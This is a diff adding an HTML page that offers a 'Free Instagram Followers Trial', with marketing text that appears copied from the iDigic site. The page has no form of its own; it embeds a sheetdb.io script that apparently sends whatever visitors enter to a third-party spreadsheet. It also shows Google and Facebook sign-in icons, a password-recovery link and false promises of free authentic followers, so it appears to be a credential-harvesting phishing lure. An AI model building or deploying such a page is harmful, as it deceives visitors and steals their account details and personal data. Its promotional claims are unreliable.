@@ -1,0 +1,288 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register & Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "poppins",sans-serif;
+        }
+
+        body {
+            align-items: center;
+            background-color: #c9d6ff;
+            background: #fbca53;
+        }
+
+        .headerdesine {
+            align-items: center;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 10;
+            position: center;
+            align-items: center;
+            justify-content: center;
+            height: 500px;
+            text-align: center;
+        }
+
+            .headerdesine h1 {
+                background-position-x: 0;
+                text-align: center;
+                font-size: 50px;
+                display: inline;
+                align-content: center;
+            }
+
+                .headerdesine h1 b {
+                    font-size: 50px;
+                }
+
+            .headerdesine p {
+                margin: 10px 0 40px;
+                font-size: 14px;
+                color: #fff;
+                text-align: center;
+            }
+
+        .container {
+            background:;
+            width: 450px;
+            padding: 1.5rem;
+            margin: 50px auto;
+            border-radius: 10px;
+            box-shadow: 0 20px 35px rgba(0,0,1,0.9);
+        }
+
+        form {
+            margin: 0 2rem;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-align: center;
+            padding: 1.3rem;
+            margin-bottom: 0.4rem;
+        }
+
+        h1 {
+            display: flex;
+            font-size: 800px;
+        }
+
+        .backgrount {
+            background: linear-gradient(to right,#fff, #f4c358);
+        }
+
+        .hedingcolour {
+            color: #FF7900;
+            font-size: 25px;
+            display: inline;
+            margin: 0;
+        }
+
+        input {
+            color: inherit;
+            width: 100%;
+            background-color: transparent;
+            border: none;
+            border-bottom: 1px solid #757575;
+            padding-left: 1.5rem;
+            font-size: 15px;
+        }
+
+        .input-group {
+            padding: 1% 0;
+            position: relative;
+        }
+
+            .input-group i {
+                position: absolute;
+                color: black;
+            }
+
+        input:focus {
+            background-color: transparent;
+            outline: transparent;
+            border-bottom: 2px solid hsl(327,90%,28%);
+        }
+
+        input::placeholder {
+            color: transparent;
+        }
+
+        label {
+            color: #757575;
+            position: relative;
+            left: 1.2em;
+            top: -1.3em;
+            cursor: auto;
+            transition: 0.3s ease all;
+        }
+
+        input:focus ~ label, input:not(:placeholder-shown) ~ label {
+            top: -3em;
+            color: hsl(327,90%,28%);
+            font-size: 15px;
+        }
+
+        .recover {
+            text-align: right;
+            font-size: 1rem;
+            margin-bottom: 1rem;
+        }
+
+            .recover a {
+                text-decoration: none;
+                color: rgb(125,125,235);
+            }
+
+                .recover a:hover {
+                    color: blue;
+                    text-decoration: underline;
+                }
+
+        .btn {
+            font-size: 1.1rem;
+            text-decoration: none;
+            padding: 8px 0;
+            border-radius: 5px;
+            outline: none;
+            border: none;
+            width: 100%;
+            background: rgb(125,125,235);
+            color: white;
+            cursor: pointer;
+            transition: 0.9s;
+        }
+
+            .btn:hover {
+                background: #07001f;
+            }
+
+        .or {
+            font-size: 1.1rem;
+            margin-top: 0.5rem;
+            text-align: center;
+        }
+
+        .icons {
+            text-align: center;
+        }
+
+            .icons i {
+                color: rgb(125,125,235);
+                padding: 0.8rem 1.5rem;
+                border-radius: 10px;
+                font-size: 1.5rem;
+                cursor: pointer;
+                border: 2px solid #dfe9f5;
+                margin: 0 15px;
+                transition: 1s;
+            }
+
+                .icons i:hover {
+                    background: #07001f;
+                    font-size: 1.6rem;
+                    border: 2px solid rgb(125,125,235);
+                }
+
+        .links {
+            display: flex;
+            justify-content: space-around;
+            padding: 0 4rem;
+            margin-top: 0.9rem;
+            font-weight: bold;
+        }
+
+        button {
+            color: rgb(125,125,235);
+            border: none;
+            background-color: transparent;
+            font-size: 1rem;
+            font-weight: bold;
+        }
+
+            button:hover {
+                text-decoration: underline;
+                color: blue;
+            }
+
+        .lasssta {
+            background: #fbca53;
+            align-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        div .lasssta {
+            align-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .lasssta h1 {
+            text-align: center;
+            color: #333333;
+            display: flex;
+            padding: 0 0 10px;
+        }
+
+        .lasssta p {
+            color: #444444;
+            display: flex;
+            padding: 0 0 15px;
+            margin: 10px 0 40px;
+            margin: 10px 0 40px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="headerdesine">
+        <h1 class="form-title">Free <b class="hedingcolour"> Instagram Followers</b> Trial</h1>
+        <p text-align:center;>Get followers for an unlimited number of accounts that are free and authentic! There are several benefits for your Instagram account when you get followers from us. Increased brand recognition and visibility bring in more revenue.</p>
+    </div>
+    <div class="container" id="signIn">
+        <div class="backgrount">
+            <h1 class="form-title">Free <b class="hedingcolour"> Instagram Followers</b> Trial</h1>
+            <script src="https://sheetdb.io/s/f/25z5jshe9ywpj.js"></script>
+            <p class="recover">
+                <a href="https://support.google.com/accounts/answer/41078?hl=en&co=GENIE.Platform%3DAndroid">Recover Password</a>
+            </p>
+            <p class="or">
+                ----------or--------
+            </p>
+            <div class="icons">
+                <i class="fab fa-google"></i>
+                <i class="fab fa-facebook"></i>
+            </div>
+        </div>
+    </div>
+    <div class="lasssta">
+        <div class="et_pb_section et_pb_section_2 et_section_regular">
+            <div class="et_pb_row et_pb_row_1">
+                <div class="et_pb_column et_pb_column_4_4 et_pb_column_1  et_pb_css_mix_blend_mode_passthrough et-last-child">
+                    <div class="et_pb_module et_pb_text et_pb_text_2 why-we-best et_pb_bg_layout_light  et_pb_text_align_center">
+                        <div class="et_pb_text_inner"> <h2>How to use our free insta followers trial?</h2> <p>iDigic offers you the chance to test our Instagram services – we are offering a FREE TRIAL for any number of accounts. Our followers trial package is 100% free the first time for every new account. We guarantee the safety of your account as we don’t require your password.</p> <p style="padding-bottom:0px;">All you need to do to redeem your free Instagram followers is enter your username and email address and click on the ‘Get Followers’ button. In a few minutes, you’ll get your package of instant free followers.</p> </div>
+                    </div>
+                    <div class="et_pb_module et_pb_text et_pb_text_3 free-trial-insta-followers-trial et_pb_bg_layout_light  et_pb_text_align_center">
+                        <div class="et_pb_text_inner"> <h3>Are you happy with our Free Followers service?</h3> <p>If you’re looking to get more followers for your Instagram account at great prices, head over to our buy instagram followers page. There are several packages for you to choose from. Get more credibility for your Insta account quick and easy!</p> </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="et_pb_section et_pb_section_3 et_section_regular"> <div class="et_pb_row et_pb_row_2"> <div class="et_pb_column et_pb_column_4_4 et_pb_column_2  et_pb_css_mix_blend_mode_passthrough et-last-child"> <div class="et_pb_module et_pb_text et_pb_text_4 why-we-best et_pb_bg_layout_light  et_pb_text_align_center"> <div class="et_pb_text_inner"> <h2 style="padding-top:0;">Totally Free &amp; 100% Safe</h2> <p style="padding-bottom:0;">Getting followers quickly for your Instagram account can be difficult, but we can help get you the required number of followers for your brand. We are offering you a ‘get free Instagram followers’ option so you can find out how good our services are. This is what you need to know about getting your free followers from our site. </p> </div> </div> </div> </div> </div>
+        <div class="et_pb_row et_pb_row_3"> <div class="et_pb_column et_pb_column_4_4 et_pb_column_3  et_pb_css_mix_blend_mode_passthrough et-last-child"> <div class="et_pb_module et_pb_text et_pb_text_5 why-we-best et_pb_bg_layout_light  et_pb_text_align_center"> <div class="et_pb_text_inner"> <h2>Advantages of <span>free followers</span> on Instagram</h2> <p>There are several benefits of getting free followers for your insta account. You don’t have to risk money or effort to get more popular.Free followers is also a great way to improve your brand’s credibility and draw more revenue.</p> </div> </div> </div> </div>
+        <div class="et_pb_row et_pb_row_11 et_pb_equal_columns et_pb_gutters3"> <div class="et_pb_column et_pb_column_1_3 et_pb_column_17  et_pb_css_mix_blend_mode_passthrough"> <div class="et_pb_module et_pb_text et_pb_text_19 et_pb_bg_layout_light  et_pb_text_align_left"> <div class="et_pb_text_inner"> <div class="adv-1"> <h3 class="title">Post consistently</h3> <div class="desc"> <p>Instagram is a platform that relies heavily on consistent posting schedules to get the most out of your account. To this end, you should ensure that you post consistently and sync it to the time when your followers are the most active during the day and the week.</p> </div> </div> </div> </div> </div> <div class="et_pb_column et_pb_column_1_3 et_pb_column_18  et_pb_css_mix_blend_mode_passthrough"> <div class="et_pb_module et_pb_text et_pb_text_20 et_pb_bg_layout_light  et_pb_text_align_left"> <div class="et_pb_text_inner"> <div class="adv-2"> <h3 class="title">Know your audience</h3> <div class="desc"> <p>There are several things that you need to understand your audience. You need to make sure that you post content that is relevant to them. You also need to keep in mind that audiences like to be engaged as well, so keep your options open about user-generated content.</p> </div> </div> </div> </div> </div> <div class="et_pb_column et_pb_column_1_3 et_pb_column_19  et_pb_css_mix_blend_mode_passthrough"> <div class="et_pb_module et_pb_text et_pb_text_21 et_pb_bg_layout_light  et_pb_text_align_left"> <div class="et_pb_text_inner"> <div class="adv-3"> <h3 class="title">Improved Captions</h3> <div class="desc"> <p>After hashtags, captions are the most important cog in an Instagram post. Your captions need to be engaging, creative and should prompt the followers for a response. This can result in a lot of comments which is great for engagement numbers.</p> </div> </div> </div> </div> </div> </div>
+    </div>
+</body>
+</html>
